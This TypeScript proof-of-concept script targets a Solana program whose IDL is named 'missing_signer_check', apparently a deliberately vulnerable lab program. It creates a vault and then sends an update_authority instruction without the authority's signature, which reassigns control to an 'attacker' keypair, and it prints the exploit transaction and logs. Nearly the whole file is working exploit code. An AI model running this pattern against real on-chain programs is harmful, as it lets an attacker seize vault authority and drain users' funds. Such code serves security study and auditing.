import * as anchor from "@coral-xyz/anchor";
import fs from "fs";
import path from "path";
import {
  Connection,
  PublicKey,
  Keypair,
  SystemProgram,
  Transaction,
  TransactionInstruction,
  sendAndConfirmTransaction,
} from "@solana/web3.js";

function pubkeyToBuffer(pk: PublicKey): Buffer {
  return Buffer.from(pk.toBytes());
}

async function main() {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const connection: Connection = provider.connection;

  const programIdStr = process.env.PROGRAM_ID || "EUFqStpHaAdFnLVpfykXhvah1obeh6suB9XeFU9DTxdU";
  const PROGRAM_ID = new PublicKey(programIdStr);

  const idlPath = path.join(__dirname, "../target/idl/missing_signer_check.json");
  const idl = JSON.parse(fs.readFileSync(idlPath, "utf8"));

  const initDisc: number[] = idl.instructions.find((i: any) => i.name === "initialize").discriminator;
  const updateDisc: number[] = idl.instructions.find((i: any) => i.name === "update_authority").discriminator;

  const payer = (provider.wallet as any).payer as Keypair;
  const vault = Keypair.generate();
  const attacker = Keypair.generate();

  console.log("PROGRAM_ID:", PROGRAM_ID.toBase58());

  // Initialize vault with payer as authority
  const initData = Buffer.concat([Buffer.from(initDisc), pubkeyToBuffer(payer.publicKey)]);
  const initIx = new TransactionInstruction({
    programId: PROGRAM_ID,
    keys: [
      { pubkey: vault.publicKey, isSigner: true, isWritable: true },
      { pubkey: payer.publicKey, isSigner: true, isWritable: true },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
    ],
    data: initData,
  });
  const initTx = new Transaction().add(initIx);
  await sendAndConfirmTransaction(connection, initTx, [payer, vault], { commitment: "confirmed" });

  const beforeInfo = await connection.getAccountInfo(vault.publicKey);
  if (!beforeInfo) throw new Error("vault not created");
  const authorityBefore = new PublicKey(beforeInfo.data.subarray(8, 40));

  const updateData = Buffer.concat([Buffer.from(updateDisc), pubkeyToBuffer(attacker.publicKey)]);
  const updateIx = new TransactionInstruction({
    programId: PROGRAM_ID,
    keys: [
      { pubkey: vault.publicKey, isSigner: false, isWritable: true },
      { pubkey: authorityBefore, isSigner: false, isWritable: false },
    ],
    data: updateData,
  });
  const updateTx = new Transaction().add(updateIx);
  const exploitSig = await sendAndConfirmTransaction(connection, updateTx, [payer], { commitment: "confirmed" });

  const afterInfo = await connection.getAccountInfo(vault.publicKey);
  if (!afterInfo) throw new Error("vault missing after exploit");
  const authorityAfter = new PublicKey(afterInfo.data.subarray(8, 40));

  console.log("VAULT:", vault.publicKey.toBase58());
  console.log("AUTHORITY_BEFORE:", authorityBefore.toBase58());
  console.log("EXPLOIT_TX:", exploitSig);
  console.log("AUTHORITY_AFTER:", authorityAfter.toBase58());

  try {
    const tx = await connection.getTransaction(exploitSig, {
      commitment: "confirmed",
      maxSupportedTransactionVersion: 0,
    } as any);
    if (tx?.meta?.logMessages) {
      console.log("LOGS_START");
      for (const line of tx.meta.logMessages) console.log(line);
      console.log("LOGS_END");
    }
  } catch {}
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
